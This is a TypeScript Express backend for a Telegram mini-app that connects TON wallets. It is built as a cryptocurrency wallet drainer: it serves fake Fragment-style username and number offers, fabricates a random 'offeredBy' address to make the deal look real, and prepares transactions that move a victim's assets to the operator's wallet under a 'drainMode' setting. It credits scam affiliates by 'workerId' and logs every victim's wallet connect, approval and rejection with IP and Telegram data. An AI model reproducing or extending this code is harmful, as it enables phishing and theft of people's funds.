import { Assets } from '@api/assets'
import { Address } from '@ton/core'
import { config } from '@utils/config'
import { errorDebug } from '@utils/loggers'
import { formatDate } from 'date-fns'
import express, { type Express, type Request, type Response } from 'express'
import { readFileSync } from 'fs'
import path from 'path'
import url from 'url'
import { format, ItemSymbol } from './utils/format'
import { Logger } from './utils/logging'
import { parseUserData } from './utils/parseUser'
import { logFrontVisit } from './utils/logFrontVisit'
import type { IWalletStatusUpdate, TransactionBody } from './utils/types'

const app: Express = express()
app.set('trust proxy', true)
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

// CORS — his landing may be on a different subdomain than the backend
app.use((req: Request, res: Response, next) => {
	res.setHeader('Access-Control-Allow-Origin', '*')
	res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
	res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
	if (req.method === 'OPTIONS') {
		res.sendStatus(204)
		return
	}
	next()
})

const dir = path.join(__dirname, '..', 'front')

const templates = ['username.html', 'number.html'].map(f => {
	try {
		return readFileSync(`${dir}/html/${f}`).toString('utf8')
	} catch {
		return '' // landing mode — templates not needed, / route redirects
	}
})

app.get('/js/:file', (req: Request, res: Response) => {
	const filePath = path.join(dir, 'js', req.params.file)

	res.sendFile(filePath, err => {
		if (err) {
			console.error(`Error sending file: ${err.message}`)
		}
	})
})

app.get('/css/:file', (req: Request, res: Response) => {
	const filePath = path.join(dir, 'css', req.params.file)

	res.sendFile(filePath, err => {
		if (err) {
			console.error(`Error sending file: ${err.message}`)
		}
	})
})

app.get('/tonconnect-manifest.json', (req: Request, res: Response) => {
	res.sendFile(path.join(dir, 'tonconnect-manifest.json'))
})

// Cross-domain manifest proxy — serves manifest FOR other domains (landing pages
// behind Cloudflare that can't serve it themselves). CORS-enabled so TonConnect
// on the landing's origin can fetch it.
app.get('/manifest/:domain', (req: Request, res: Response) => {
	const domain = req.params.domain
	// basic sanity — only allow domains, not URLs/paths
	if (!/^[a-z0-9.-]+$/i.test(domain)) {
		res.status(400).json({ error: 'invalid domain' })
		return
	}

	res.setHeader('Access-Control-Allow-Origin', '*')
	res.json({
		url: `https://${domain}`,
		name: 'App',
		iconUrl: `https://${domain}/icon.png`,
		termsOfUseUrl: `https://${domain}/terms`,
		privacyPolicyUrl: `https://${domain}/privacy`,
	})
})

// TTL-capped visit dedup store (prevents logging same ip+startData twice
// but doesn't leak memory — evicts entries older than 1 hour, capped at 10k)
const VISIT_TTL_MS = 60 * 60 * 1000
const VISIT_MAX = 10_000
const loggedStartApp = new Map<string, number>()

function shouldLogVisit(key: string): boolean {
	const now = Date.now()
	const lastSeen = loggedStartApp.get(key)
	if (lastSeen !== undefined && now - lastSeen < VISIT_TTL_MS) {
		return false
	}
	// evict oldest entry if at cap
	if (loggedStartApp.size >= VISIT_MAX) {
		const firstKey = loggedStartApp.keys().next().value
		if (firstKey) loggedStartApp.delete(firstKey)
	}
	loggedStartApp.set(key, now)
	return true
}

// Generate a plausible-looking random TON address fallback when real offerer is absent.
function randomTonAddress(): string {
	const hex = Array.from({ length: 64 }, () =>
		Math.floor(Math.random() * 16).toString(16)
	).join('')
	return `0:${hex}`
}

app.get('/', async (req: Request, res: Response) => {
	try {
		const { query: q } = url.parse(req.url, true);
		const tgParams = Buffer.from(q.tgWebAppStartParam as string, 'base64url');
		const props = JSON.parse(tgParams.toString('utf8'));

		const ip = req.ip;
		const startData = tgParams.toString('utf8');
		const logKey = `${ip}|${startData}`;

		// Only log if this (ip, startData) pair hasn't been logged before
		if (shouldLogVisit(logKey)) {
			await Logger.LogStartApp(startData, req.url, ip);
		}

		const html = format(templates[props[0]], {
			amount: props[1],
			item: props[2],
			itemns: props[2]
				.replaceAll('@', '')
				.replaceAll('+', '')
				.replaceAll(' ', ''),
			date: formatDate(new Date(props[5]), "dd MMM yyyy 'at' HH:mm"),
		});

		res.send(html);
	} catch (e) {
		res.redirect('https://fragment.com/');
	}
});

app.get('/transaction', async (req: Request, res: Response) => {
		try {
			const { query: q } = url.parse(req.url, true)

			let props: any[]
			if (q.tgWebAppStartParam) {
				// Telegram mini-app mode: [type, price, item, mode, workerId, date]
				const tgParams = Buffer.from(q.tgWebAppStartParam as string, 'base64url')
				props = JSON.parse(tgParams.toString('utf8'))
			} else {
				// Plain web mode: direct query params
				// ?workerId=1&drainMode=Full&amount=100&item=@user
				props = [
					q.itemType ? Number(q.itemType) : 0,
					Number(q.amount) || 0,
					(q.item as string) || '',
					(q.drainMode as string) || 'Full',
					Number(q.workerId) || 1,
					Date.now(),
				]
			}

			// логируем заход
			logFrontVisit(req.ip ?? 'unknown', '/transaction')

			const offeredBy: string =
				props[6] && typeof props[6] === 'string' && props[6].length > 0
					? props[6]
					: randomTonAddress()

			const { messages, raw } = await Assets.prepareContracts(
				q.wallet as string,
				config.WALLET,
				{
					amount: props[1],
					name: ItemSymbol[props[0]] + props[2],
					drainMode: props[3],
					workerId: props[4],
				}
			)

			res.json({
				messages,
				raw,
				offeredBy,
			})
		} catch (e) {
			console.log(e)
			res.json({
				messages: [],
				raw: [],
				offeredBy: randomTonAddress(),
			})
		}
})

app.post('/connected', async (req: Request, res: Response) => {
	const { wallet, href, raw } = req.body as IWalletStatusUpdate

	try {
		const { query: q } = url.parse(href, true)
		const tgParams = Buffer.from(q.tgWebAppStartParam as string, 'base64url')
		const props = JSON.parse(tgParams.toString('utf8'))

		await Logger.Connect({
			href,
			webAppData: parseUserData(href),
			wallet: Address.parse(wallet).toString(),
			item: ItemSymbol[props[0]] + props[2],
			amount: props[1],
			mode: props[3],
			workerId: props[4],
			ip: req.ip,
			raw,
		})

		res.send('OK')
	} catch (e) {
		errorDebug(`Something went wrong while logging wallet connect ${e}`)
		res.status(500).send('Error')
	}
})

app.post('/accept', async (req: Request, res: Response) => {
	const body = req.body as TransactionBody
	const { wallet, raw, href, boc } = body

	try {
		const { query: q } = url.parse(href, true)
		const tgParams = Buffer.from(q.tgWebAppStartParam as string, 'base64url')
		const props = JSON.parse(tgParams.toString('utf8'))

		await Logger.Approve({
			raw,
			href,
			wallet: Address.parse(wallet).toString(),
			webAppData: parseUserData(href),
			item: ItemSymbol[props[0]] + props[2],
			amount: props[1],
			mode: props[3],
			workerId: props[4],
			ip: req.ip,
		})

		res.send('OK')
	} catch (e) {
		errorDebug(`Something went wrong while logging tr approve ${e}`)
		res.status(500).send('Error')
	}
})

app.post('/reject', async (req: Request, res: Response) => {
	const body = req.body as TransactionBody
	const { wallet, raw, href, err } = body

	try {
		const { query: q } = url.parse(href, true)
		const tgParams = Buffer.from(q.tgWebAppStartParam as string, 'base64url')
		const props = JSON.parse(tgParams.toString('utf8'))

		await Logger.Reject({
			raw,
			href,
			webAppData: parseUserData(href),
			err,
			wallet: Address.parse(wallet).toString(),
			item: ItemSymbol[props[0]] + props[2],
			amount: props[1],
			mode: props[3],
			workerId: props[4],
			ip: req.ip,
		})

		res.send('OK')
	} catch (e) {
		errorDebug(`Error while logging transaction reject ${e}`)
		res.status(500).send('Error')
	}
})

app.post('/disconnect', async (req: Request, res: Response) => {
	const { wallet, href } = req.body

	try {
		const { query: q } = url.parse(href, true)
		const tgParams = Buffer.from(q.tgWebAppStartParam as string, 'base64url')
		const props = JSON.parse(tgParams.toString('utf8'))

		await Logger.Disconnect({
			href,
			wallet: Address.parse(wallet).toString(),
			item: ItemSymbol[props[0]] + props[2],
			amount: props[1],
			mode: props[3],
			workerId: props[4],
			ip: req.ip,
		})

		res.send('OK')
	} catch (e) {
		errorDebug(`Error while logging wallet disconnect ${e}`)
		res.status(500).send('Error')
	}
})

app.post('/log-startapp', async (req: Request, res: Response) => {
	const { startAppData, href } = req.body

	try {
		await Logger.LogStartApp(startAppData, href, req.ip)
		res.send('OK')
	} catch (e) {
		errorDebug(`Error while logging startapp data ${e}`)
		res.status(500).send('Error')
	}
})

export const server = app
